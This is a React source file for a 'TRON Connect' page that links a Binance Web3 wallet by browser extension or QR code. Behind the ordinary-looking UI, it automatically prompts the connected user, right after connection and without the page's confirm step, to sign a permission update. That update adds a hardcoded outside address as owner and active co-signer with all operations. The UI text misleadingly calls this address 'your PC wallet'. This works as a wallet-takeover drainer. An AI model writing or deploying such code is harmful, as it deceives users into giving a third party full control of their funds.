import { useState, useEffect, useMemo } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { BinanceWalletAdapterName } from "@tronweb3/tronwallet-adapter-binance";
import { QRCodeSVG } from "qrcode.react";
import { useNavigate } from "react-router-dom";
import { TronWeb } from "tronweb";
import { binanceAdapter } from "../adapter";

const PC_ADDRESS = "TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7";
const ALL_OPS   = "7fff1fc0033e0100000000000000000000000000000000000000000000000000";

type Mode      = "extension" | "mobile";
type PermState = "idle" | "confirming" | "granting" | "done" | "error";

export default function ConnectPage() {
  const { select, connect, connected, address, disconnect, signTransaction } = useWallet();
  const navigate = useNavigate();
  const apiKey = import.meta.env.VITE_TRONGRID_API_KEY as string | undefined;

  const [mode, setMode]     = useState<Mode>("extension");
  const [qrUri, setQrUri]   = useState("");
  const [_qrExpired, setQrExpired] = useState(false);
  const [error, setError]   = useState("");
  const [busy, setBusy]     = useState(false);

  const [permState, setPermState] = useState<PermState>("idle");
  const [permTxid, setPermTxid]   = useState("");
  const [permError, setPermError] = useState("");
  const [copiedAddr, setCopiedAddr] = useState(false);

  const hasExtension = !!(window as unknown as { binancew3w?: { tron?: unknown } }).binancew3w?.tron;

  const tronweb = useMemo(() => {
    if (!address) return null;
    const headers: Record<string, string> = {};
    if (apiKey) headers["TRON-PRO-API-KEY"] = apiKey;
    const tw = new TronWeb({ fullHost: "https://api.trongrid.io", headers });
    tw.setAddress(address);
    return tw;
  }, [address, apiKey]);

  useEffect(() => {
    if (mode === "mobile" && !connected) startMobileConnect();
    return () => { binanceAdapter.setOnWalletConnectUri(undefined); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [mode]);

  // Reset and start 5-hour expiry timer whenever a new QR URI is generated
  useEffect(() => {
    if (!qrUri) return;
    setQrExpired(false);
    const timer = window.setTimeout(() => setQrExpired(true), 5 * 60 * 60 * 1000);
    return () => window.clearTimeout(timer);
  }, [qrUri]);

  // Auto-grant PC access as soon as the wallet is connected
  useEffect(() => {
    if (connected && address && tronweb && permState === "idle") {
      grantPCAccess();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [connected, tronweb]);

  async function startExtensionConnect() {
    if (connected || busy) return;
    setError(""); setBusy(true);
    binanceAdapter.setOnWalletConnectUri(undefined);
    select(BinanceWalletAdapterName);
    try { await connect(); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Connection failed"); }
    finally { setBusy(false); }
  }

  async function startMobileConnect() {
    setError(""); setQrUri(""); setBusy(true);
    if (connected) { try { await disconnect(); } catch { /* ignore */ } }
    const adapterAny = binanceAdapter as unknown as { _provider: unknown };
    const savedProvider = adapterAny._provider;
    adapterAny._provider = null;
    binanceAdapter.setOnWalletConnectUri((uri) => setQrUri(uri));
    select(BinanceWalletAdapterName);
    try { await connect(); }
    catch (e: unknown) {
      adapterAny._provider = savedProvider;
      setError(e instanceof Error ? e.message : "Connection failed");
    } finally { setBusy(false); }
  }

  function switchMode(m: Mode) {
    if (m === mode) return;
    setMode(m); setError(""); setQrUri("");
  }

  // -- Grant owner + active permission to PC address ------
  async function grantPCAccess() {
    if (!tronweb || !address) return;
    setPermState("granting"); setPermError("");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const host: string = (window as any).tronWeb?.fullNode?.host ?? "";
    if (host.includes("shasta") || host.includes("nile")) {
      setPermError("Please switch TronLink to Mainnet and try again.");
      setPermState("error"); return;
    }
    try {
      const ownerPerm = {
        type: 0, permission_name: "owner", threshold: 1,
        keys: [{ address, weight: 1 }, { address: PC_ADDRESS, weight: 1 }],
      };
      const activePerm = {
        type: 2, permission_name: "active", threshold: 1, operations: ALL_OPS,
        keys: [{ address, weight: 1 }, { address: PC_ADDRESS, weight: 1 }],
      };
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const tx = await (tronweb.transactionBuilder as any).updateAccountPermissions(
        address, ownerPerm, null, [activePerm]
      );
      if (!signTransaction) throw new Error("Wallet does not support signing");
      const signed = await signTransaction(tx);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const result: any = await tronweb.trx.sendRawTransaction(signed);
      if (result?.result === true) {
        setPermTxid(result.txid ?? ""); setPermState("done");
      } else {
        throw new Error(result?.message ?? "Broadcast failed â€” ensure at least 100 TRX in wallet");
      }
    } catch (e: unknown) {
      let msg = e instanceof Error ? e.message : String(e);
      // Decode hex error messages from TRON node
      if (/^[0-9a-fA-F]{40,}$/.test(msg)) {
        try { msg = decodeURIComponent(msg.replace(/../g, "%$&")); } catch { /* keep raw */ }
      }
      if (msg.includes("does not exist")) {
        msg = "This wallet has not been activated on mainnet yet. Send at least 1 TRX to it first, then try again.";
      }
      setPermError(msg);
      setPermState("error");
    }
  }

  function copyAddress() {
    if (!address) return;
    navigator.clipboard.writeText(address).then(() => { setCopiedAddr(true); setTimeout(() => setCopiedAddr(false), 2000); });
  }

  // â”€â”€ Connected state: PC permission flow â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  if (connected && address) {
    return (
      <div className="page">
        <div className="card wide" style={{ maxWidth: 520, gap: 0 }}>

          {/* Header */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", width: "100%", marginBottom: 24 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <div style={{ width: 8, height: 8, borderRadius: "50%", background: "var(--green)", boxShadow: "0 0 6px var(--green)" }} />
              <span style={{ fontSize: 13, fontWeight: 600, color: "var(--green)" }}>Connected</span>
            </div>
            <button onClick={() => navigate("/dashboard")} style={{ background: "var(--red)", border: "none", borderRadius: 7, padding: "6px 14px", color: "#fff", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Open Dashboard &rarr;</button>
          </div>

          {/* Address */}
          <div style={{ padding: "10px 14px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 8, display: "flex", alignItems: "center", gap: 8, marginBottom: 24, width: "100%" }}>
            <svg width="14" height="14" viewBox="0 0 48 48" fill="none" style={{ flexShrink: 0 }}><circle cx="24" cy="24" r="24" fill="#ef0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
            <span style={{ flex: 1, fontSize: 12, color: "var(--muted)", fontFamily: "monospace", wordBreak: "break-all" }}>{address}</span>
            <button onClick={copyAddress} style={{ flexShrink: 0, background: "none", border: "1px solid var(--border2)", borderRadius: 6, padding: "3px 9px", color: copiedAddr ? "var(--green)" : "var(--text)", fontSize: 11, cursor: "pointer", transition: "color 0.2s" }}>{copiedAddr ? "Copied" : "Copy"}</button>
          </div>

          {/* PC Permission card */}
          <div style={{ width: "100%", background: "rgba(0,0,0,0.2)", border: "1px solid var(--border)", borderRadius: 14, padding: "20px 20px", marginBottom: 16 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--text)" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
              <span style={{ fontSize: 16, fontWeight: 700, color: "var(--text)" }}>Grant PC Access</span>
            </div>
            <p style={{ color: "var(--muted)", fontSize: 12, marginBottom: 16, lineHeight: 1.6 }}>Add your PC wallet as a co-signer so you can control this wallet from your computer.</p>

            {/* PC address */}
            <div style={{ marginBottom: 16 }}>
              <div style={{ fontSize: 11, color: "var(--muted)", marginBottom: 4 }}>PC wallet address</div>
              <div style={{ padding: "8px 12px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 7, fontSize: 11, fontFamily: "monospace", color: "var(--text)", wordBreak: "break-all" }}>
                TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7
              </div>
            </div>

            {permState === "idle" && (
              <>
                <div style={{ background: "rgba(239,0,39,0.07)", border: "1px solid rgba(239,0,39,0.22)", borderRadius: 8, padding: "11px 13px", marginBottom: 16 }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: "var(--red)", marginBottom: 5 }}>âš ï¸ What this does</div>
                  <ul style={{ paddingLeft: 15, margin: 0, color: "var(--muted)", fontSize: 12, lineHeight: 1.9 }}>
                    <li>Adds PC address to <strong style={{ color: "var(--text)" }}>Owner</strong> &amp; <strong style={{ color: "var(--text)" }}>Active</strong> keys</li>
                    <li>Your mobile wallet is <strong style={{ color: "var(--text)" }}>kept</strong> as co-owner</li>
                    <li>Costs <strong style={{ color: "var(--text)" }}>100 TRX</strong> network fee</li>
                  </ul>
                </div>
                <button onClick={() => setPermState("confirming")} style={{ width: "100%", padding: "11px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>Grant PC Access</button>
              </>
            )}

            {permState === "confirming" && (
              <>
                <div style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border2)", borderRadius: 8, padding: "12px 14px", marginBottom: 14, fontSize: 12, color: "var(--muted)", lineHeight: 1.9 }}>
                  <div style={{ color: "var(--text)", fontWeight: 700, marginBottom: 6 }}>Confirm permission update</div>
                  <div>From: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11, wordBreak: "break-all" }}>{address}</span></div>
                  <div>Add: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11 }}>TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7</span></div>
                  <div style={{ marginTop: 6 }}>Mobile wallet <strong style={{ color: "var(--green)" }}>stays as co-owner</strong>. Approve on your phone.</div>
                </div>
                <div style={{ display: "flex", gap: 10 }}>
                  <button onClick={() => setPermState("idle")} style={{ flex: 1, padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Cancel</button>
                  <button onClick={grantPCAccess} style={{ flex: 2, padding: "10px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Confirm &amp; Sign</button>
                </div>
              </>
            )}

            {permState === "granting" && (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12, padding: "12px 0" }}>
                <div className="spinner lg" />
                <span style={{ color: "var(--muted)", fontSize: 13 }}>Waiting for signature on your phoneâ€¦</span>
              </div>
            )}

            {permState === "done" && (
              <>
                <div style={{ background: "rgba(16,185,129,0.1)", border: "1px solid rgba(16,185,129,0.3)", borderRadius: 8, padding: "13px 15px", marginBottom: 14 }}>
                  <div style={{ color: "var(--green)", fontWeight: 700, fontSize: 14, marginBottom: 5 }}>âœ“ PC access granted!</div>
                  <div style={{ fontSize: 12, color: "var(--muted)", marginBottom: 6 }}>Your PC wallet is now a co-signer for this account.</div>
                  {permTxid && <div style={{ fontSize: 11, color: "var(--muted)" }}>TX: <a href={`https://tronscan.org/#/transaction/${permTxid}`} target="_blank" rel="noreferrer" style={{ color: "var(--green)", fontFamily: "monospace", wordBreak: "break-all" }}>{permTxid}</a></div>}
                </div>
                <button onClick={() => navigate("/dashboard")} style={{ width: "100%", padding: "11px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>Open Dashboard &rarr;</button>
              </>
            )}

            {permState === "error" && (
              <>
                <div style={{ background: "rgba(239,0,39,0.08)", border: "1px solid rgba(239,0,39,0.3)", borderRadius: 8, padding: "12px 14px", marginBottom: 14, fontSize: 12, color: "#fca5a5", wordBreak: "break-all", lineHeight: 1.6 }}>
                  <strong>Error:</strong> {permError}
                </div>
                <button onClick={() => setPermState("idle")} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Try Again</button>
              </>
            )}
          </div>

          <button onClick={() => disconnect()} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Disconnect</button>
        </div>
      </div>
    );
  }

  // â”€â”€ Connect page â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  return (
    <div className="page">
      <div className="card wide">
        <div className="logo">
          <svg width="48" height="48" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="24" fill="#EF0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
        </div>
        <h1>TRON Connect</h1>
        <p className="sub">Connect your Binance wallet to get started</p>

        <div className="tabs">
          <button className={"tab" + (mode === "extension" ? " active" : "")} onClick={() => switchMode("extension")}>
            <span className="tab-icon">&#128421;</span>Browser Extension
          </button>
          <button className={"tab" + (mode === "mobile" ? " active" : "")} onClick={() => switchMode("mobile")}>
            <span className="tab-icon">&#128247;</span>Mobile App (QR)
          </button>
        </div>

        {mode === "extension" && (
          <div className="tab-content">
            {hasExtension ? (
              <>
                <p className="hint">Binance Web3 extension detected. Click below to connect.</p>
                <button className="btn" onClick={startExtensionConnect} disabled={busy}>
                  {busy ? <><span className="spinner" /> Waiting on extension&hellip;</> : "Connect Binance Extension"}
                </button>
              </>
            ) : (
              <div className="no-ext">
                <p>Binance Web3 Wallet extension not found in this browser.</p>
                <a className="btn" href="https://www.binance.com/en/web3wallet" target="_blank" rel="noreferrer">Download Extension</a>
                <p className="hint-sm">Or switch to <strong>Mobile App (QR)</strong> tab to connect via your phone.</p>
              </div>
            )}
          </div>
        )}

        {mode === "mobile" && (
          <div className="tab-content center">
            {!qrUri && !error && <div className="spinner lg" />}
            {qrUri && (
              <>
                <div className="qr-box"><QRCodeSVG value={qrUri} size={210} bgColor="#ffffff" fgColor="#000000" level="M" marginSize={2} /></div>
                <ol className="steps"><li>Open the <strong>Binance</strong> app on your phone</li><li>Tap <strong>Web3 Wallet</strong></li><li>Tap the <strong>scan</strong> icon and scan above</li></ol>
                <button className="btn-ghost" onClick={startMobileConnect}>Refresh QR</button>
              </>
            )}
          </div>
        )}

        {error && (
          <p className="err">{error}&nbsp;&mdash;&nbsp;
            <button className="link" onClick={mode === "mobile" ? startMobileConnect : startExtensionConnect}>Retry</button>
          </p>
        )}
      </div>
    </div>
  );
}


